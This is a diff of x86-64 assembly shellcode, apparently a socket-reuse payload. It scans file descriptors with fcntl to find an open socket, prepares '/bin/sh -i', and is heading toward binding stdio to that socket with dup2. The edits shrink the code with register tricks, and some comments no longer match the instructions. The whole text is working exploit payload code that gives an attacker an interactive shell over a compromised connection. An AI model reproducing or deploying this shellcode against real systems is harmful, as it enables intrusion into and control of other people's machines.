@@ -4,13 +4,14 @@ section .text
 	global _start
 
 _start:
+	;; int 0x3
 	call start
 	db "/bin/sh", 0, 0
 	db "-i", 0
 	align 4
 
 start:
-	mov rdi, 2 		; let's start with fd 3, because 0 - 2 are usualy used for stdio
+	xor rdi, rdi 		; let's start with fd 3, because 0 - 2 are usualy used for stdio
 
 	xor rax, rax
 	inc rax			; set rax to a non-zero value (we need that for the condition at check_fd_loop_end)
@@ -18,17 +19,17 @@ start:
 	jmp check_fd_loop_end
 
 check_fd_loop_start:
-	inc rdi
-	mov r9, rdi
+	dec dil
+	mov r9b, dil
 
 	mov rax, 72		; call fcntl
 	mov rsi, 1		; use flag F_GETFD // This does detect if the fd is valid, i need to find something to be sure it's our socket
 	syscall
 
-	mov rdi, r9
+	mov dil, r9b
 
 check_fd_loop_end:
-	cmp rax, 0		; if fcntl() returned 0, we get a valid fd
+	test rax, rax 		; if fcntl() returned 0, we get a valid fd
 	jne check_fd_loop_start
 
 ;;; Let's dup2() to bind filedescriptors to the socket
